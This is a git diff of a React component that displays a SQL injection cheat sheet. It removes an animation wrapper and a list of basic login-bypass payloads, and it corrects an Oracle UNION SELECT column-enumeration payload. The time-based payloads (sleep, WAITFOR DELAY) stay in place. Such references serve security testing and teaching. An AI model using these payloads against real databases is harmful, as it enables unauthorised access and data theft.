@@ -1,6 +1,5 @@
 import React from 'react';
 import { Typography, Divider } from 'antd';
-import QueueAnim from 'rc-queue-anim';
 
 const { Title, Paragraph, Text, Link } = Typography;
 
@@ -57,7 +56,7 @@ export default function SQLi () {
         },
         {
             db_type: 'Oracle',
-            title: `' UNION SELECT column_name,NULL FROM  where table_name="X"  -- -`
+            title: `' UNION SELECT column_name,NULL FROM all_tab_columns where table_name="X"  -- -`
         },
     ]
 
@@ -100,16 +99,6 @@ export default function SQLi () {
         },
 
     ]
-
-    const BasicSql = [
-        { title: "' or '1'='1" },
-        { title: "); or 1=1 -- -" },
-        { title: "' OR '1" },
-        { title: "' AND 1=1 -- -" },
-        { title: ' OR "" = "' },
-        { title: '" OR 1 = 1 -- -"' },
-        { title: "' OR '' = '" },
-    ];
     const TimeBased = [
         { title: ',(select * from (select(sleep(10)))a)' },
         { title: "';WAITFOR DELAY '0:0:30'--" }
@@ -143,7 +132,7 @@ export default function SQLi () {
         }
     ];
     return (
-        <QueueAnim delay={300} duration={1500}>
+        <div>
             <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                 SQL Injection
             </Title>
@@ -318,6 +307,6 @@ export default function SQLi () {
                     );
                 } )}
             </div>
-        </QueueAnim>
+        </div>
     );
 }
